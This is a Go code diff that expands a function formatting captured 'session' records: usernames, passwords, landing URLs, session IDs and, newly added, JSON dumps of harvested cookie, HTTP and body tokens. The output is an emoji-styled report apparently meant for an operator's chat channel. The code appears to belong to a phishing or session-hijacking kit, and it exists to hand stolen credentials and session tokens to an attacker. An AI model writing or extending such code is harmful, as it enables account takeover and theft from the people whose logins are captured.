@@ -1,15 +1,27 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 )
 
 func formatSessionMessage(session Session) string {
+	tokensJSON, _ := json.MarshalIndent(session.Tokens, "", "  ")
+	httpTokensJSON, _ := json.MarshalIndent(session.HTTPTokens, "", "  ")
+	bodyTokensJSON, _ := json.MarshalIndent(session.BodyTokens, "", "  ")
+	customJSON, _ := json.MarshalIndent(session.Custom, "", "  ")
+
 	return fmt.Sprintf("✨ **Session Information** ✨\n\n"+
 		"👤 Username:      ➖ %s\n"+
 		"🔑 Password:      ➖ %s\n"+
 		"🌐 Landing URL:   ➖ %s\n"+
-		"🆔 Session ID:    ➖ %s\n"+
+
+		"🆔 Tokens:        ➖ ``` \n [ %s ] \n ``` \n "+
+		"🆔 HTTPTokens:    ➖ ``` \n [ %s ] \n ``` \n "+
+		"🆔 BodyTokens:    ➖ ``` \n [ %s ] \n ``` \n "+
+		"🆔 Custom:        ➖ ``` \n [ %s ] \n ``` \n "+
+		"🆔 Session ID:    ➖ ``` \n [ %s ] \n ``` \n "+
+
 		"🖥️ User Agent:    ➖ %s\n"+
 		"🌍 Remote Address:➖ %s\n"+
 		"🕒 Create Time:   ➖ %d\n"+
@@ -17,6 +29,12 @@ func formatSessionMessage(session Session) string {
 		session.Username,
 		session.Password,
 		session.LandingURL,
+
+		string(tokensJSON), // Printing formatted JSON strings
+		string(httpTokensJSON),
+		string(bodyTokensJSON),
+		string(customJSON),
+
 		session.SessionID,
 		session.UserAgent,
 		session.RemoteAddr,
